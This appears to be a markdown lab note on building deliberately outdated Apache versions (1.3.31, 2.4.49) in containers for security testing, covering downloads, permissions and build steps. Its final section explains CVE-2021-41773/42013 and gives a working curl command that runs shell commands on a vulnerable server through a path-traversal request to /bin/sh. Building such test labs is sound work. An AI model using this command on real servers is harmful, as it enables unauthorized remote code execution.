# Progress So Far

## Apache Files for Download

1. First Link: https://httpd.apache.org/security/vulnerabilities_13.html
2. Critial Search: https://www.google.com/search?client=firefox-b-1-d&q=Apache%2F1.3.31+vulnerabiliteis
3. Where to find old versions: https://archive.apache.org/dist/httpd/binaries/linux/

## Loosened Permissions

1. Had to loosen the following:
    - capabailities
    - mounts
    - resources
    - syscalls

## Key Testing Note

1. Similar to JuiceShop have to make the mountdir the uid/gid of the container, otherwise we can't write.

For instance notice the 10000 here:

```sh
drwxrwxr-x  8 sikeboy sikeboy 4096 Jun  5 22:48 dvwa_dir
drwxrwxr-x 32   10000   10000 4096 Jun  7 21:08 juice-shop
```

## How to Install dependencies

```sh
sudo apt install nmap
# Add the metasploitable install below
```

## How to Install Apache

Prior to this you have to make these in the host:

```sh
 sudo chown -R 10000:10000 /usr/local/apache2/
```

Download and Extract APR and APR-Util

    Download APR and APR-Util:
    Download the APR and APR-Util source packages.

```sh

wget https://archive.apache.org/dist/apr/apr-1.7.0.tar.gz
wget https://archive.apache.org/dist/apr/apr-util-1.6.1.tar.gz
```

Extract APR and APR-Util:
Extract the downloaded tarballs and place them in the srclib directory of the Apache source tree.

```sh

tar -xvzf apr-1.7.0.tar.gz
tar -xvzf apr-util-1.6.1.tar.gz
mv apr-1.7.0 httpd-2.4.49/srclib/apr
mv apr-util-1.6.1 httpd-2.4.49/srclib/apr-util
```

```sh
bash ./configure --prefix=/usr/local/apache2 --with-pcre=/usr/local/pcre/bin/pcre-config --with-included-apr
export PATH=$PATH:/usr/bin
make
make install
```

## After must change the Listen and Server

```sh
nano /usr/local/apache2/conf/httpd.conf
```

Then in the file do:

```sh
Listen 172.18.0.2:3000
ServerName 172.18.0.2:3000
```

After saving and exiting the file execute these:

```sh
/usr/local/apache2/bin/apachectl -k restart
/usr/local/apache2/bin/apachectl -k start
```


## Simple fix to add gcc libraries

```sh
export PATH=$PATH:/usr/bin
```

## How to Install pcre (Must Be Done on LocalHost)

```sh
sudo apt-get install -y libpcre3 libpcre3-dev
```

## How to Install apr and apr-util (Apache Runtime)

Download both:

- apr-util-1.6.3.tar.gz
- apr-1.7.4.tar.gz

## Helpful Troubleshooting Sites

1. https://www.linuxfromscratch.org/blfs/view/svn/general/apr.html
2. https://docs.oracle.com/cd/B13789_01/server.101/q20201/install.html
3. https://www.linuxfromscratch.org/blfs/view/svn/general/apr-util.html
4. https://stackoverflow.com/questions/13967114/configure-error-apr-not-found-please-read-the-documentation
5. https://apr.apache.org/download.cgi 
6. https://archive.apache.org/dist/httpd/ 
7. https://docs.oracle.com/cd/B13789_01/server.101/q20201/install.html
8. https://forums.centos.org/viewtopic.php?t=56062 

## Using the Exploits 

## RCE exploit both for Apache 2.4.49 (CVE-2021-41773) and 2.4.50 (CVE-2021-42013):

IMHO only "special" setups will be vulnerable to this RCE.\
Same happens for the "arbitrary file read" exploits you have seen.

Both CVEs are indeed almost the same path-traversal vulnerability (2nd one is the uncomplete fix for 1st one).\
Path traversal only work from a mapped URI (e.g. via "Alias" or "ScriptAlias" Apache directives). DocumentRoot only is not sufficient.

"/cgi-bin/" is mapped by default (ScriptAlias) so that's why it's being used before the path traversal string.\
Besides, ScriptAlias marks as Exec (for Apache) all the contents for the given directory (regardless the file extensions).

### Requirements:
1. mod_cgi enabled (not default but easy)\
2. target binary should be +x (default for /bin/sh)\
3. apache permissions granted for /bin or / (not default and difficult/unrealistic)\

### Check if server is vulnerable:
`curl 'http://IPADDR/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh' --data 'echo Content-Type: text/plain; echo; id'`

### Response from a vulnerable server:
`uid=1(daemon) gid=1(daemon) groups=1(daemon)`
